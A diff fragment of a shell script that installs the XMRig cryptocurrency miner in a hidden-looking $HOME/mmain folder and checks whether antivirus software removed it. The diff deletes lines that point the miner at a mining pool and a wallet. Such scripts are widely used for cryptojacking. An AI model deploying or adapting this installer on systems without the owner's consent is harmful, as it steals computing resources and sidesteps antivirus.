@@ -99,7 +99,6 @@ fi
 rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/mmain/config.json
 $HOME/mmain/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/mmain/xmrig ]; then
@@ -125,7 +124,6 @@ if (test $? -ne 0); then
   rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/mmain/config.json
   $HOME/mmain/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HOME/mmain/xmrig ]; then
@@ -138,11 +136,6 @@ if (test $? -ne 0); then
 fi
 
 echo "[*] Miner $HOME/mmain/xmrig is OK"
-
-sed -i 's/"url": *"[^"]*",/"url": "pool.hashvault.pro:80",/' $HOME/mmain/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/mmain/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/mmain/xmrig.log'",#' $HOME/mmain/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/mmain/config.json
 
 echo "[*] Creating $HOME/mmain/miner.sh script"
 cat >$HOME/mmain/miner.sh <<EOL
